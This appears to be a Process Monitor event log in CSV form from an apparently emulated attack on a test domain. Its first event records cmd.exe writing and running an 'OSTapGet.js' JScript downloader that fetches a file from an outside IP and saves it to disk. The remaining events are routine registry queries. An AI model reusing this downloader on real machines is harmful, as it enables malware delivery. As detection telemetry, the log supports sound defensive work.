Process Name,PID,Operation,Path,Result,Detail,Date & Time,Event Class,Image Path,User,Command Line,TID,Parent PID,Content,LineID,srcEvent
cmd.exe,3616,Process Start,,SUCCESS,"Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows",4/14/2022 10:03:29 PM,Process,C:\Windows\system32\cmd.exe,BLUETEAM\ezk,"cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js",6244,3264,"cmd.exe 3616 Process Start None SUCCESS Parent PID: 3264, Command line: cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js, Current directory: C:\Windows\system32\, Environment:  ;	ALLUSERSPROFILE=C:\ProgramData ;	APPDATA=C:\Users\ezk\AppData\Roaming ;	CommonProgramFiles=C:\Program Files\Common Files ;	CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files ;	CommonProgramW6432=C:\Program Files\Common Files ;	COMPUTERNAME=DESKTOP-BA1RQFC ;	ComSpec=C:\Windows\system32\cmd.exe ;	DriverData=C:\Windows\System32\Drivers\DriverData ;	HOMEDRIVE=C: ;	HOMEPATH=\Users\ezk ;	LOCALAPPDATA=C:\Users\ezk\AppData\Local ;	LOGONSERVER=\\DC02 ;	NUMBER_OF_PROCESSORS=2 ;	OneDrive=C:\Users\ezk\OneDrive ;	OS=Windows_NT ;	Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\ezk\AppData\Local\Microsoft\WindowsApps ;	PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL ;	PROCESSOR_ARCHITECTURE=AMD64 ;	PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 165 Stepping 5, GenuineIntel ;	PROCESSOR_LEVEL=6 ;	PROCESSOR_REVISION=a505 ;	ProgramData=C:\ProgramData ;	ProgramFiles=C:\Program Files ;	ProgramFiles(x86)=C:\Program Files (x86) ;	ProgramW6432=C:\Program Files ;	PSModulePath=C:\Users\ezk\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules ;	PUBLIC=C:\Users\Public ;	SystemDrive=C: ;	SystemRoot=C:\Windows ;	TEMP=C:\Users\ezk\AppData\Local\Temp ;	TMP=C:\Users\ezk\AppData\Local\Temp ;	USERDNSDOMAIN=BLUETEAM.COM ;	USERDOMAIN=BLUETEAM ;	USERDOMAIN_ROAMINGPROFILE=BLUETEAM ;	USERNAME=ezk ;	USERPROFILE=C:\Users\ezk ;	windir=C:\Windows 4/14/2022 10:03:29 PM Process C:\Windows\system32\cmd.exe BLUETEAM\ezk cmd.exe /C echo var url = ""https://128.30.52.100/TR/PNG/iso_8859-1.txt"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js && cscript //E:Jscript %TEMP%\OSTapGet.js 6244 3264",1,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\Enabled,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 1",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\Enabled SUCCESS Type: REG_DWORD, Length: 4, Data: 1 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1892,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\Version,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\Version SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1893,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\StoresServiceClassInfo,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\StoresServiceClassInfo SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1894,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1895,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1896,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000003 SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1897,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64 SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1898,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegOpenKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004,SUCCESS,Desired Access: Read,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegOpenKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004 SUCCESS Desired Access: Read 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1899,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\LibraryPath,SUCCESS,"Type: REG_SZ, Length: 66, Data: %SystemRoot%\system32\wshbth.dll",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\LibraryPath SUCCESS Type: REG_SZ, Length: 66, Data: %SystemRoot%\system32\wshbth.dll 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1900,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\LibraryPath,SUCCESS,"Type: REG_SZ, Length: 66, Data: %SystemRoot%\system32\wshbth.dll",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\LibraryPath SUCCESS Type: REG_SZ, Length: 66, Data: %SystemRoot%\system32\wshbth.dll 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1901,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString,BUFFER OVERFLOW,Length: 12,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString BUFFER OVERFLOW Length: 12 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1902,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString,SUCCESS,"Type: REG_SZ, Length: 40, Data: Bluetooth Namespace",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString SUCCESS Type: REG_SZ, Length: 40, Data: Bluetooth Namespace 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1903,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString,SUCCESS,"Type: REG_SZ, Length: 40, Data: Bluetooth Namespace",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString SUCCESS Type: REG_SZ, Length: 40, Data: Bluetooth Namespace 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1904,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString,SUCCESS,"Type: REG_SZ, Length: 40, Data: Bluetooth Namespace",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\DisplayString SUCCESS Type: REG_SZ, Length: 40, Data: Bluetooth Namespace 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1905,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderId,SUCCESS,"Type: REG_BINARY, Length: 16, Data: E0 63 AA 06 60 7D FF 41 AF B2 3E E6 D2 D9 39 2D",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderId SUCCESS Type: REG_BINARY, Length: 16, Data: E0 63 AA 06 60 7D FF 41 AF B2 3E E6 D2 D9 39 2D 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1906,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\AddressFamily,NAME NOT FOUND,Length: 16,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\AddressFamily NAME NOT FOUND Length: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1907,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\SupportedNameSpace,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 16",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\SupportedNameSpace SUCCESS Type: REG_DWORD, Length: 4, Data: 16 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1908,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\Enabled,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 1",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\Enabled SUCCESS Type: REG_DWORD, Length: 4, Data: 1 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1909,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\Version,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\Version SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1910,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\StoresServiceClassInfo,SUCCESS,"Type: REG_DWORD, Length: 4, Data: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\StoresServiceClassInfo SUCCESS Type: REG_DWORD, Length: 4, Data: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1911,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1912,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryValue,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderInfo,SUCCESS,"Type: REG_BINARY, Length: 0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryValue HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004\ProviderInfo SUCCESS Type: REG_BINARY, Length: 0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1913,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegCloseKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004,SUCCESS,,4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,cscript.exe 5992 RegCloseKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64\000000000004 SUCCESS None 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616,1914,522f3f35cd013e63830fa555495a0081_raw_events
cscript.exe,5992,RegQueryKey,HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64,SUCCESS,"Query: HandleTags, HandleTags: 0x0",4/14/2022 10:03:29 PM,Registry,C:\Windows\system32\cscript.exe,BLUETEAM\ezk,cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js,10480,3616,"cscript.exe 5992 RegQueryKey HKLM\System\CurrentControlSet\Services\WinSock2\Parameters\NameSpace_Catalog5\Catalog_Entries64 SUCCESS Query: HandleTags, HandleTags: 0x0 4/14/2022 10:03:29 PM Registry C:\Windows\system32\cscript.exe BLUETEAM\ezk cscript  //E:Jscript C:\Users\ezk\AppData\Local\Temp\OSTapGet.js 10480 3616",1915,522f3f35cd013e63830fa555495a0081_raw_events
